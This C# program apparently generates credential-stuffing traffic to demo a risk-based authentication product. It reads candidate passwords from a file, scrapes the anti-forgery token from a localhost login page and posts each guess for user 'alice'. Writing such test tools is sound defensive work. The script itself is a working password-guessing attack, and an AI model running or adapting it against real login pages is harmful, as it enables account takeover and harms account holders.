using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using HtmlAgilityPack;
using Console = System.Console;

namespace Rsk.RiskBasedAuthentication.Duende.CredStuffer
{
    internal class Program
    {
        public static int Count { get; set; } = 0;
        public static string URL { get; set; }
        public static string Path { get; set; }
        public static TimeSpan Delay { get; set; }

        static void Main(string[] args)
        {

            URL = "https://localhost:5500/Account/Login";
            Path = "passwords.txt";
            Delay = TimeSpan.FromSeconds(1);
            MainAsync(args).GetAwaiter().GetResult();
        }

        static async Task MainAsync(string[] args)
        {
            using (var sr = new StreamReader(Path))
            {
                while (!sr.EndOfStream)
                {
                    var pass = await sr.ReadLineAsync();

                    await Task.Run(() => LogOn(pass));
                    Count++;

                    PrintResults(pass);
                    await Task.Delay(Delay);
                    Console.Clear();

                }
            }
        }

        static async Task LogOn(string cred)
        {
            using (var client = new HttpClient())
            {
                var result = await client.GetAsync(URL);
                var getResult = await result.Content.ReadAsStringAsync();

                var htmlDoc = new HtmlDocument();
                htmlDoc.LoadHtml(getResult);

                var requestVerificationToken = htmlDoc.DocumentNode.SelectSingleNode("//input[@name='__RequestVerificationToken']")
                    .Attributes.First(x => x.Name == "value").Value;
                //.SelectSingleNode("value");

                var formData = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string?, string?>("ReturnUrl", ""),
                    new KeyValuePair<string?, string?>("Username", "alice"),
                    new KeyValuePair<string?, string?>("Password", cred),
                    new KeyValuePair<string?, string?>("Button", "login"),
                    new KeyValuePair<string?, string?>("__RequestVerificationToken", requestVerificationToken),
                    new KeyValuePair<string?, string?>("Input.RememberLogin", "false"),
                });

                var response = await client.PostAsync("https://localhost:5500/Account/Login", formData);
                getResult = await response.Content.ReadAsStringAsync();

            }
        }

        static void PrintResults(string pass)
        {
            Console.WriteLine("Credential Stuffing");
            Console.WriteLine($"URl {URL}\n");
            Console.WriteLine($"Rate: {Delay.ToString()}");
            Console.WriteLine($"Attempted Password: {pass}\n");
            Console.WriteLine($"Credentials Attempted: {Count}");
            Console.WriteLine($"Successful Logins: 0");
            Console.WriteLine($"Failed Logins: {Count}");
        }
    }
}
